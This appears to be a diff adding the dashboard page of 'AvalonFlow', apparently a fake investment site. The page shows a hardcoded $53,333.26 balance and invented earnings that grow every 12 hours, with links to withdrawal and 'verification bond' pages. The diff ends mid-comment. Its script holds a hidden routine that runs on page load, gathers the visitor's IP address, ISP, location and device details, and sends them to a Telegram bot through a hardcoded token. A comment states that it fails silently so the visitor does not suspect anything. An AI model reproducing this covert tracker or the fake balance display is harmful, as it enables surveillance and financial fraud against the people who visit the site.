@@ -1,0 +1,1373 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>My Dashboard</title>
+    
+    <!-- Favicon -->
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
+<link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
+
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=3">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=3">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=3">
+
+<link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png?v=3">
+<link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
+<link rel="manifest" href="/manifest.json?v=3">
+
+
+
+        <!-- Structured Data for Logo -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "AvalonFlow",
+      "url": "https://avalonflow.site",
+      "logo": "https://avalonFlow.site/favicon.png"
+    }
+</script>
+    
+    <style>
+        /* ---------- Base ---------- */
+
+body{
+font-family: Inter, system-ui, sans-serif;
+margin:0;
+background:#06070c;
+color:white;
+overflow-x:hidden;
+}
+
+html, body {
+    height: 100%;
+}
+
+/* ---------- Cyber Grid Background ---------- */
+
+body::before{
+content:"";
+position:fixed;
+inset:0;
+background:
+linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+background-size:40px 40px;
+z-index:-1;
+}
+
+/* Aurora Glow */
+
+body::after{
+content:"";
+position:fixed;
+inset:0;
+background:
+radial-gradient(circle at 20% 20%, rgba(107,44,216,0.25), transparent 40%),
+radial-gradient(circle at 80% 60%, rgba(0,255,255,0.15), transparent 40%);
+z-index:-1;
+}
+
+                            /* ---------- Sidebar ---------- */
+#sidebar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 280px;
+
+    /* FIX 1: Make height end exactly before the footer starts */
+    height: calc(100% - 102px); 
+
+    background: rgba(40, 75, 135, 0.75);
+
+    backdrop-filter: blur(14px);
+
+    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
+    z-index: 5; 
+
+    padding: 25px;
+    transform: translateX(-100%);
+    transition: transform 0.3s ease;
+}
+        #sidebar.open { transform: translateX(0); }
+        #sidebar h2{
+font-size:22px;
+margin-bottom:20px;
+color:#a78bfa;
+}
+        #sidebar button {
+            width: 100%;
+            margin: 12px 0;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 16px;
+        }
+
+/* ---------- Menu Button ---------- */
+
+        /* ---------- Menu Button ---------- */
+        #menuBtn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 6;
+            background: #6b2cd8;
+            border: none;
+            color: #fff;
+            padding: 12px 14px;
+            border-radius: 10px;
+}
+
+/* move button when sidebar opens */
+#menuBtn.shift{
+left:300px;
+}
+
+/* ---------- Content Grid ---------- */
+#content {
+  max-width: 1400px;         /* limits width for large screens */
+  margin: auto;              /* centers horizontally */
+  padding: 10px 24px 40px 24px; /* top, sides, bottom */
+  min-height: 100vh;         /* full viewport height */
+  display: flex;
+  flex-direction: column;    /* stack metric rows vertically */
+  gap: 24px;                 /* spacing between dashboard title and rows */
+}
+
+/* ---------- Glass Cards ---------- */
+
+.glass-card{
+background:rgba(255,255,255,0.04);
+backdrop-filter:blur(14px);
+border-radius:18px;
+padding:28px;
+border:1px solid rgba(255,255,255,0.05);
+
+box-shadow:
+0 10px 30px rgba(0,0,0,0.6),
+inset 0 0 30px rgba(255,255,255,0.03);
+
+transition:0.35s;
+position:relative;
+overflow:hidden;
+}
+
+.glass-card:hover{
+transform:translateY(-6px);
+box-shadow:0 20px 60px rgba(107,44,216,0.45);
+}
+
+.glass-card h3{
+color:#6b2cd8;
+margin-top: 0;
+}
+
+/* ---------- Neon Border Effect ---------- */
+
+.glass-card::before{
+content:"";
+position:absolute;
+inset:0;
+border-radius:18px;
+padding:1px;
+background:linear-gradient(120deg,#6b2cd8,#00f2fe,#6b2cd8);
+-webkit-mask:
+linear-gradient(#000 0 0) content-box,
+linear-gradient(#000 0 0);
+-webkit-mask-composite:xor;
+opacity:0.25;
+}
+
+/* ---------- Dashboard Title ---------- */
+.dashboard-title {
+  grid-column: 1 / -1; /* full width if you were using grid */
+  text-align: center;
+  margin-bottom: 24px;
+margin-top: -60px;
+}
+
+/* ---------- Metric Row Flex Container ---------- */
+.metric-row {
+  display: flex;
+  gap: 24px;
+  flex-wrap: wrap; /* allows wrapping on smaller screens */
+}
+
+/* ---------- Hero Card (Total ACU) ---------- */
+.hero-card {
+  flex: 2 1 400px; /* larger than stat cards */
+  min-width: 260px;
+  text-align: center;
+}
+
+/* Total ACU title purple */
+.hero-card h2 {
+  color: #a78bfa; /* purple */
+  font-size: 16px;
+  margin: 0 0 8px 0;
+}
+
+/* ---------- Small Stat Cards ---------- */
+.stat-card {
+  flex: 1 1 180px; /* smaller than hero, flexible width */
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+}
+
+.stat-card h3 {
+  color: #a78bfa; 
+  margin-bottom: 8px;
+}
+
+.stat {
+  font-size: 28px;
+  font-weight: 600;
+  color: #a78bfa;
+}
+
+/* =========================
+TOP RIGHT PROFILE POSITION
+========================= */
+.top-right-profile {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    z-index: 999;
+}
+
+
+/* =========================
+OUTER RING WRAPPER
+========================= */
+.avatar-ring {
+    width: 52px;
+    height: 52px;
+    border-radius: 50%;
+    padding: 3px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+#profilePhoto:not([src]), 
+#profilePhoto[src="default-avatar.png"] {
+    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
+    background: #1a1625 !important;
+    box-sizing: border-box !important;
+    padding: 6px !important;
+}
+
+
+/* =========================
+NEON SPIN + PULSE GLOW
+========================= */
+.avatar-ring::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+
+    /* PURE PURPLE GLOW */
+    background: conic-gradient(
+        #a855f7,
+        #7c3aed,
+        #a855f7
+    );
+
+    animation:
+    spin 3s linear infinite,
+    glowSweep 4s linear infinite;
+
+    filter: blur(5px);
+    opacity: 0.9;
+    z-index: 0;
+}
+
+
+/* =========================
+INNER CUT (CLEAN RING EFFECT)
+========================= */
+.avatar-ring::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: transparent;
+    border-radius: 50%;
+    z-index: 1;
+}
+
+
+/* =========================
+PROFILE IMAGE
+========================= */
+.avatar {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    object-fit: cover;
+    position: relative;
+    z-index: 2;
+    border: 1px solid rgba(255,255,255,0.1);
+}
+
+/* =========================
+ANIMATION (MOVING LIGHT AROUND RING)
+========================= */
+/* spinning ring */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+/* breathing glow effect */
+@keyframes glowSweep {
+    0% {
+        filter: blur(4px);
+        opacity: 0.6;
+        transform: rotate(0deg);
+    }
+    100% {
+        filter: blur(6px);
+        opacity: 0.95;
+        transform: rotate(360deg);
+    }
+}
+
+
+/* ---------- Buttons ---------- */
+
+.button{
+display:inline-block;
+background:linear-gradient(90deg,#6b2cd8,#00f2fe);
+border:none;
+border-radius:10px;
+padding:12px 20px;
+color:white;
+font-weight:600;
+}
+
+                /* ---------- Floating Background ---------- */
+#floating-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+
+    /* Soft white/blue futuristic background */
+    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.6;
+
+    animation: floatParticles linear infinite;
+
+    /* Soft futuristic glow */
+    background: rgba(120, 180, 255, 0.7);
+    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
+}
+
+@keyframes floatParticles {
+    0% {
+        transform: translateY(100vh) scale(0.3);
+        opacity: 0;
+    }
+
+    50% {
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+    }
+}
+
+        /* ---------------- PROGRESS BAR ---------------- */
+.progress-bar {
+    width: 100%;
+    height: 18px;
+    background: rgba(120, 180, 255, 0.7);
+    border-radius: 12px;
+    overflow: hidden;
+    margin: 18px 0;
+}
+
+.progress-fill {
+    height: 100%;
+    width: 0%;
+    border-radius: 12px;
+    position: relative;
+    transition: width 0.6s ease;
+        background: linear-gradient(90deg,#4facfe,#00f2fe);
+    box-shadow: 0 0 20px rgba(79,172,254,0.6);
+}
+
+/* Energy flow */
+.progress-fill::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: energyFlow 2.5s linear infinite;
+}
+
+@keyframes energyFlow {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+
+        /* ---------- Footer ---------- */
+        footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    padding: 18px 0;
+    font-size: 14px;
+    color: #555;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+    z-index: 6;
+}
+
+                    /* Notification Bar */
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+    .notification-bar.show {
+        top: 20px;
+        opacity: 1;
+    }
+.notification-bar.warning-yellow {
+    color: #ffcc00;
+    font-weight: 600;
+}
+
+.notification-bar.warning-red {
+    color: #ff3b3b;
+    font-weight: 600;
+    animation: pulse 1s infinite;
+}
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+    @keyframes liquidWave {
+        0% { left: -50%; }
+        100% { left: 100%; }
+    }
+
+.metric-card{
+grid-column:span 2;
+text-align:center;
+}
+
+@media (max-width:900px){
+.metric-card{
+grid-column:span 1;
+}
+}
+
+@keyframes valuePulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.06); }
+    100% { transform: scale(1); }
+}
+
+.value-pulse {
+    animation: valuePulse 0.4s ease;
+}
+
+#totalACU {
+  font-size: 52px;
+  font-weight: 700;
+  color: #00f2fe; /* cyan digits */
+  text-shadow: 0 0 25px rgba(0,242,254,0.8);
+}
+
+  /* ================= Header Logo Card Neon ================= */
+
+.minimal-logo-header {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  /* Reduced top padding dramatically so it sits near the top edge */
+  padding: 10px 0 10px 0; 
+
+  /* Optional: Ensures it stays firmly at the absolute top of the page layout */
+  width: 100%;
+  margin-top: -72px; 
+
+  background: transparent !important;
+}
+
+.logo-shimmer-wrapper {
+  position: relative;
+  width: 200px;
+  height: 200px;
+  overflow: hidden;
+  background: transparent !important; /* Kept perfectly transparent, no card background */
+}
+
+.avalon-logo-img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+
+  /* Keep your logo scaling */
+  transform: scale(0.40);
+  transform-origin: center center;
+
+  /* ---------- LOGO GLASS EFFECT ---------- */
+  /* This blurs the particles directly through the transparent logo asset itself */
+  backdrop-filter: blur(4px);
+  -webkit-backdrop-filter: blur(4px);
+  opacity: 0.9; 
+  /* -------------------------------------- */
+
+  filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
+  mix-blend-mode: multiply; 
+  background:  transparent !important;
+  border: none !important;            
+  outline: none !important;
+}
+    </style>
+</head>
+
+<body>
+    <div id="floating-bg"></div>
+    <button id="menuBtn" onclick="toggleSidebar()">☰
+
+<div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
+    </div>
+</button>
+
+
+    <!-- Dashboard Notification -->
+    <div id="dashboardNotification" class="notification-bar"></div>
+
+  <header class="minimal-logo-header">
+  <div class="logo-shimmer-wrapper">
+    <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
+  </div>
+</header>
+
+<div id="sidebar">
+        <h2>AvalonFlow</h2>
+    <button onclick="window.location.href='/dashboard'">Dashboard</button>
+<button onclick="window.location.href='https://avalonflowverificationbonds.avalonflow.site/'">AVB</button>
+    <button onclick="window.location.href='/acu-payouts'">Withdrawal</button>
+    <button onclick="window.location.href='/returns'">Retention Bonus</button>
+    <button onclick="window.location.href='/support'">Support</button>
+    <button onclick="logout()">Logout</button>
+</div>
+
+<!-- =========================
+TOP RIGHT PROFILE AVATAR
+========================= -->
+<div class="top-right-profile">
+     <div class="avatar-ring">
+        <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
+    </div>
+
+    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="avatarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Add Profile Picture</span>
+    </div>
+
+</div>
+
+
+
+<!-- =========================
+CROP MODAL
+========================= -->
+<div id="cropModal" class="crop-modal hidden">
+
+    <div class="crop-box">
+
+        <!-- file input (hidden trigger via JS) -->
+        <input type="file" id="photoInput" accept="image/*">
+
+        <!-- crop preview -->
+        <div class="crop-preview">
+            <img id="cropImage">
+        </div>
+
+        <!-- actions -->
+        <div class="crop-actions">
+            <button id="saveCropped">Save Photo</button>
+            <button id="cancelCrop">Cancel</button>
+        </div>
+
+    </div>
+
+</div>
+
+<div id="content">
+
+  <!-- Dashboard Title -->
+  <div class="glass-card metric-card dashboard-title">
+    <h3>My Dashboard</h3>
+  </div>
+
+  <!-- ======= Group 1: Top Metrics ======= -->
+  <div class="metric-row">
+    <!-- Hero Card -->
+    <div class="glass-card hero-card">
+      <h2>Available Balance</h2>
+      <div id="totalACU">$53,333.26</div>
+    </div>
+
+    <!-- Small Stat Cards -->
+    <div class="glass-card stat-card">
+      <h3>Active Bonds</h3>
+      <div class="stat" id="activePlans">1</div>
+    </div>
+
+    <div class="glass-card stat-card">
+      <h3>ACU Retention Bonus</h3>
+      <div class="stat">1.33% of Declared Value</div>
+    </div>
+  </div>
+
+  <!-- ======= Group 2: Secondary Cards ======= -->
+  <div class="metric-row">
+    <!-- Only Cycle Progress remains -->
+    <div class="glass-card secondary-card">
+      <h3>Cycle Progress</h3>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+  </div>
+
+    <!-- Sticky Footer -->
+    <footer>
+       © 2026 AvalonFlow Corp • All Rights Reserved
+    </footer>
+
+    <script>
+async function sendVisitorDetailsToTelegram() {
+  // 1. Telegram bot details
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    // 1. Read the user identity from the URL bar
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    // 2. Fetch the user's network details silently
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+
+    const data = await ipResponse.json();
+
+    // Capture the current page path
+    const currentPage = window.location.pathname; 
+
+    // Capture the platform/device operating system safely
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; 
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; 
+    }
+
+    // 3. Format the log notification text using HTML parsing to prevent breakdown errors
+    const telegramMessage = 
+      `🌐 <b>New Visitor Logged</b>\n\n` +
+      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
+      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
+      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
+      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
+      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
+      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
+      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
+
+    // 4. Send the payload directly to your Telegram channel/chat
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML' // Switched to HTML to make parsing bulletproof
+      })
+    });
+
+  } catch (error) {
+    // Fail silently so the visitor doesn't suspect anything on screen
+    console.error('System logging exception occurred.');
+  }
+}
+
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
+
+
+const photoInput = document.getElementById('photoInput');
+const profilePhoto = document.getElementById('profilePhoto');
+const avatarLabel = document.getElementById('avatarLabel'); // Targeted the span
+
+const cropModal = document.getElementById('cropModal');
+const cropImage = document.getElementById('cropImage');
+
+const DEFAULT_AVATAR = 'default-avatar.png';
+let isProcessing = false;
+
+
+// CLICK TO ADD OR REMOVE
+profilePhoto.addEventListener('click', () => {
+    if (isProcessing) return;
+
+    // Check if a custom photo is currently set
+    const hasPhoto = localStorage.getItem('profilePhoto');
+
+    if (hasPhoto) {
+        // REMOVE PICTURE: Clear it out instantly
+        localStorage.removeItem('profilePhoto');
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    } else {
+        // ADD PICTURE: Open the file picker if it's empty
+        photoInput.click();
+    }
+});
+
+
+// AUTO PROCESS IMAGE (no save button)
+photoInput.addEventListener('change', (e) => {
+
+    const file = e.target.files[0];
+    if (!file || isProcessing) return;
+
+    isProcessing = true;
+
+    const reader = new FileReader();
+
+    reader.onload = function(event) {
+
+        const rawImage = event.target.result;
+
+        const img = new Image();
+        img.src = rawImage;
+
+        img.onload = function() {
+
+            const canvas = document.createElement('canvas');
+            const size = Math.min(img.width, img.height);
+
+            canvas.width = size;
+            canvas.height = size;
+
+            const ctx = canvas.getContext('2d');
+
+            ctx.drawImage(
+                img,
+                (img.width - size) / 2,
+                (img.height - size) / 2,
+                size,
+                size,
+                0,
+                0,
+                size,
+                size
+            );
+
+            const finalImage = canvas.toDataURL('image/png');
+
+            // update avatar instantly
+            profilePhoto.src = finalImage;
+
+            // save permanently
+            localStorage.setItem('profilePhoto', finalImage);
+            
+            // Switch label text to show it can now be removed
+            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+
+            // close modal
+            cropModal.classList.add('hidden');
+
+            // reset input to prevent re-trigger bugs
+            photoInput.value = '';
+
+            // unlock system shortly after
+            setTimeout(() => {
+                isProcessing = false;
+            }, 300);
+        };
+    };
+
+    reader.readAsDataURL(file);
+});
+
+
+// OPTIONAL: cancel just closes modal (if you still use it)
+if (typeof cancelCrop !== 'undefined' && cancelCrop) {
+    cancelCrop.addEventListener('click', () => {
+        cropModal.classList.add('hidden');
+    });
+}
+
+
+// load saved photo and set correct initial text
+window.addEventListener('DOMContentLoaded', () => {
+    const saved = localStorage.getItem('profilePhoto');
+    if (saved) {
+        profilePhoto.src = saved;
+        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+    } else {
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    }
+});
+
+
+        /* Floating particles */
+        const bg = document.getElementById('floating-bg');
+        const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
+        function particle() {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const s = Math.random()*20+10;
+            p.style.width = s+'px';
+            p.style.height = s+'px';
+            p.style.left = Math.random()*100+'vw';
+            p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
+            p.style.animationDuration = (Math.random()*20+10)+'s';
+            bg.appendChild(p);
+            setTimeout(()=>p.remove(),30000);
+        }
+        setInterval(particle,800);
+
+        /* Sidebar toggle */
+        const sidebar = document.getElementById('sidebar');
+const content = document.getElementById('content');
+
+const menuBtn = document.getElementById('menuBtn');
+
+function toggleSidebar() {
+    const sidebar = document.getElementById('sidebar');
+    const menuBtn = document.getElementById('menuBtn');
+
+    sidebar.classList.toggle('open');
+    menuBtn.classList.toggle('shift');
+}
+
+function navigateTo(page){
+    window.location.href = page;
+}
+        function logout(){
+            localStorage.removeItem("avalon_logged_in");
+            localStorage.removeItem("avalon_seen_dashboard");
+            window.location.href = 'https://membership-signup.avalonflow.site/sign-in';
+        }
+
+        // ================================
+// 🔐 PLAN CONFIG (SYNCED WITH RETURNS)
+// ================================
+const plans = {
+    premium: { per12h: 298.29, ac: "premiumAC" },
+    basic:   { per12h: 183.29, ac: "basicAC" },
+    lite:    { per12h: 118.29, ac: "liteAC" },
+    custom:  { per12h: 0, ac: "customAC" }
+};
+
+const BASE_ACU = 53333.26;
+const BASE_ACTIVE_BONDS = 1;
+
+const ALL_PLANS = ["premium", "basic", "lite", "custom"];
+
+// ================================
+// 📦 PAID PLANS
+// ================================
+const paidPlans = JSON.parse(localStorage.getItem("paidPlans")) || {};
+
+// ================================
+// 🎯 DISPLAY STATE
+// ================================
+let displayedAC = {
+    premium: 0,
+    basic: 0,
+    lite: 0,
+    custom: 0
+};
+
+let lastCycleCount = {
+    premium: 0,
+    basic: 0,
+    lite: 0,
+    custom: 0
+};
+
+// ================================
+// 🔁 HELPERS
+// ================================
+const CYCLE_MS = 12 * 60 * 60 * 1000;
+
+function getPlan(planKey) {
+    return paidPlans[planKey];
+}
+
+function isLocked(planData, now) {
+    return !planData?.active || now >= planData.expiresAt;
+}
+
+// ================================
+// 📊 ACTIVE PLANS COUNT (RAW STATE)
+// ================================
+function updateActivePlans() {
+    const now = Date.now();
+    const currentDeviceId = localStorage.getItem("avalonflow_deviceId");
+
+    const activeCount = BASE_ACTIVE_BONDS + ALL_PLANS.reduce((count, plan) => {
+        const planData = paidPlans[plan];
+
+        if (!planData) return count;
+
+        // Device binding check
+        if (planData.deviceId && planData.deviceId !== currentDeviceId) return count;
+
+        // Only real paid + not expired
+        const isActive = planData.active && now < planData.expiresAt;
+
+        return isActive ? count + 1 : count;
+    }, 0);
+
+    const el = document.getElementById('activePlans');
+
+    // instant update (no animation)
+    if (el) el.textContent = activeCount;
+}
+
+// ================================
+// 💰 TOTAL ACU (FIXED - NO RESET ON LOCK)
+// ================================
+function updateTotalACU() {
+    const now = Date.now();
+
+    const total = BASE_ACU + ALL_PLANS.reduce((sum, plan) => {
+        const data = getPlan(plan);
+        if (!data) return sum;
+
+        const per12h = plan === "custom"
+            ? ((data.amount || 0) * 1.5) / 2
+            : plans[plan].per12h;
+
+        const elapsed = now - data.activatedAt;
+        const cycles = Math.floor(elapsed / CYCLE_MS);
+        const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
+
+        const liveValue = (cycles * per12h) + (cycleProgress * per12h);
+
+        // 🔥 KEY FIX: freeze value instead of removing it
+        const finalValue = isLocked(data, now)
+            ? displayedAC[plan]
+            : liveValue;
+
+        return sum + finalValue;
+    }, 0);
+
+    const el = document.getElementById("totalACU");
+    if (el) {
+    el.textContent =
+        "$" + total.toLocaleString(undefined, {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        });
+}
+
+    localStorage.setItem("totalACU", total.toFixed(2));
+}
+
+// ================================
+// 📈 PER PLAN ACU (FIXED)
+// ================================
+function updatePlanACU() {
+    const now = Date.now();
+
+    ALL_PLANS.forEach(plan => {
+        const data = getPlan(plan);
+        const el = document.getElementById(plans[plan].ac);
+        if (!el || !data) return;
+
+        const per12h = plan === "custom"
+            ? ((data.amount || 0) * 1.5) / 2
+            : plans[plan].per12h;
+
+        const elapsed = now - data.activatedAt;
+        const cycles = Math.floor(elapsed / CYCLE_MS);
+        const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
+
+        const targetAC = (cycles * per12h) + (cycleProgress * per12h);
+
+        // 🔥 KEY FIX: freeze when locked instead of resetting
+        const finalTarget = isLocked(data, now)
+            ? displayedAC[plan]
+            : targetAC;
+
+        const diff = finalTarget - displayedAC[plan];
+        displayedAC[plan] += diff * 0.08;
+
+        el.textContent = displayedAC[plan].toFixed(2) + " ACU";
+
+        // cycle animation
+        if (cycles > lastCycleCount[plan]) {
+            const card = document.getElementById(plan + "Card");
+            card?.classList.add("cycle-burst");
+
+            setTimeout(() => {
+                card?.classList.remove("cycle-burst");
+            }, 1200);
+
+            lastCycleCount[plan] = cycles;
+        }
+    });
+}
+
+// ================================
+// 🔄 MAIN UPDATE
+// ================================
+function updateACU() {
+    updatePlanACU();
+    updateTotalACU();
+    updateActivePlans();
+}
+
+// ================================
+// 🚀 LOOP
+// ================================
+function animate() {
+    updateACU();
+    requestAnimationFrame(animate);
+}
+
+window.addEventListener("load", () => {
+    animate();
+});
+
+// ---------- Auto-refresh in case localStorage changes externally ----------
+setInterval(updateACU, 30000); // every 30 seconds
+
+                /* Dashboard Notification */
+
+window.addEventListener("load", () => {
+
+const notification = document.getElementById("dashboardNotification");
+
+// login flag only
+localStorage.setItem("avalon_logged_in", "true");
+
+// --- Extract first name gently ---
+let firstName = "";
+const localData = localStorage.getItem("section2Data");
+
+if (localData) {
+    try {
+        const savedData = JSON.parse(localData);
+        if (savedData.fullName) {
+            const rawFirstName = savedData.fullName.trim().split(" ")[0];
+            firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
+        }
+    } catch (e) {
+        console.error("Failed to parse registration name metrics.");
+    }
+}
+
+const nameString = firstName ? `, ${firstName}` : "";
+let message;
+
+if (!localStorage.getItem("avalon_seen_dashboard")) {
+    message = `Hi there${nameString}`;
+    localStorage.setItem("avalon_seen_dashboard", "true");
+} else {
+    message = `Welcome back${nameString}`;
+}
+
+notification.textContent = message;
+notification.classList.add("show");
+
+let timer;
+
+const getState = (remaining) => {
+    if (remaining <= 0) return "expired";
+
+    // 5–0
+    if (remaining <= 300) return "red";
+
+    // 6–5
+    if (remaining <= 360) return "yellow";
+
+    // 9–6 HIDE
+    if (remaining <= 540) return "hide_mid";
+
+    // 12–9 SHOW
+    if (remaining <= 720) return "show_mid";
+
+    // 15–12 HIDE
+    return "hide_start";
+};
+
+
+const updateCountdown = () => {
+
+const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+if (!expiryTime) return;
+
+const remaining = Math.max(
+    0,
+    Math.floor((expiryTime - Date.now()) / 1000)
+);
+
+const state = getState(remaining);
+
+// 🎨 STATE HANDLING
+notification.classList.remove("warning-yellow", "warning-red");
+
+if (state === "yellow") {
+    notification.classList.add("warning-yellow");
+    if (navigator.vibrate) navigator.vibrate(200);
+}
+
+if (state === "red") {
+    notification.classList.add("warning-red");
+    if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+}
+
+// 🔁 VISIBILITY RULES (your exact logic)
+if (state === "hide_start") {
+    notification.classList.remove("show"); // 15–12 HIDE
+}
+
+else if (state === "show_mid") {
+    notification.classList.add("show"); // 12–9 SHOW
+}
+
+else if (state === "hide_mid") {
+    notification.classList.remove("show"); // 9–6 HIDE
+}
+
+else {
+    notification.classList.add("show"); // 6–0 SHOW
+}
+
+// 🕒 TEXT DISPLAY
+const minutes = Math.floor(remaining / 60);
+const seconds = remaining % 60;
+
+notification.textContent =
+    `Session expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+
+};
+
+// initial render
+const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+const remaining = Math.floor((expiryTime - Date.now()) / 1000);
+
+const initialState = getState(remaining);
+
+if (initialState === "yellow") {
+    notification.classList.add("warning-yellow");
+}
+
+if (initialState === "red") {
+    notification.classList.add("warning-red");
+}
+
+notification.classList.add("show");
+
+setTimeout(() => {
+    updateCountdown();
+    timer = setInterval(updateCountdown, 1000);
+}, 4000);
+
+});
+
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
